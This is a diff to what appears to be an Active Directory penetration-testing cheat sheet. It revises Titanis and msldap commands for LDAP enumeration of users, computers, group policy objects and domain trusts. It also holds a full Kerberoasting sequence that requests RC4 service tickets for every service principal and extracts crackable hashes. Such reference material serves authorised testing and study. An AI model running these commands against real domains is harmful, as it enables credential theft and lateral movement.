@@ -423,17 +423,19 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> kerberoast kerberoast_hashes.txt
 
 # Titanis — enumerate SPNs, get TGT, loop tgsreq per SPN, extract hashes
-# Note: scope with -BaseDN to avoid referral redirect; or use -FollowReferrals if DC is DNS resolver
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
-  "(servicePrincipalName=*)" -OutputFields sAMAccountName,servicePrincipalName \
-  -BaseDN "DC=domain,DC=local" > spns.txt
+# Use Ldap query (not Ldap search) — requires -FollowReferrals on Linux
+# -OutputFields takes one field at a time on Linux; use -OutputStyle List to get multiple attrs
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+  "(servicePrincipalName=*)" -OutputFields servicePrincipalName \
+  -OutputStyle List -FollowReferrals 2>/dev/null \
+  | awk '/^servicePrincipalName:/{print $2}' > spns.txt
 Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
   -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
 while IFS= read -r spn; do
   safe=$(echo "$spn" | tr '/:@' '_')
   kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
     -EncTypes Rc4Hmac "$spn" -OutputFile "roast_${safe}.kirbi"
-done < <(awk '/servicePrincipalName:/{print $2}' spns.txt)
+done < spns.txt
 Kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
 minikerberos-ccacheroast kerberoast-all.ccache
 ```
@@ -1847,9 +1849,9 @@ msldap "ldap+kerberos+ccache://DOMAIN\jdoe:@dc01.domain.local/?dc=192.168.1.1&cc
 # msldap — via SOCKS5
 msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=socks5&proxyhost=127.0.0.1&proxyport=1080"
 
-# Titanis
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)"
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)"
+# Titanis — use Ldap query (not Ldap search) with -FollowReferrals on Linux
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)" -FollowReferrals
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)" -FollowReferrals
 ```
 
 [↑ Back to Index](#index)
@@ -1871,22 +1873,24 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> trusts
 
 # Titanis — enumerate GPO containers
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+# Use Ldap query + -FollowReferrals on Linux; -OutputFields comma list works on Windows only
+# Linux: use -OutputStyle List and parse, or -OutputFields * and grep
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(objectClass=groupPolicyContainer)" \
-  -OutputFields displayName,gPCFileSysPath,versionNumber
+  -OutputFields displayName,gPCFileSysPath,versionNumber -FollowReferrals
 
 # Titanis — enumerate domain trusts
-Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(objectClass=trustedDomain)" \
-  -OutputFields name,trustDirection,trustType,trustAttributes,flatName
+  -OutputFields name,trustDirection,trustType,trustAttributes,flatName -FollowReferrals
 
 # Titanis — Kerberos auth variants
-Ldap search dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 \
+Ldap query dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 \
   -Password Password123 "(objectClass=groupPolicyContainer)" \
-  -OutputFields displayName,gPCFileSysPath
+  -OutputFields displayName,gPCFileSysPath -FollowReferrals
 # ⚠️ -TicketCache only works with Titanis-native ccache; use -Tgt with a Titanis-generated TGT instead
-# Ldap search dc01.domain.local -UserName jdoe@DOMAIN \
-#   -TicketCache jdoe.ccache "(objectClass=trustedDomain)" -OutputFields *
+# Ldap query dc01.domain.local -UserName jdoe@DOMAIN \
+#   -TicketCache jdoe.ccache "(objectClass=trustedDomain)" -OutputFields * -FollowReferrals
 
 # ldapsearch — raw GPO objects
 ldapsearch -H ldap://192.168.1.1 -D "CN=jdoe,CN=Users,DC=domain,DC=local" -w Password123 \
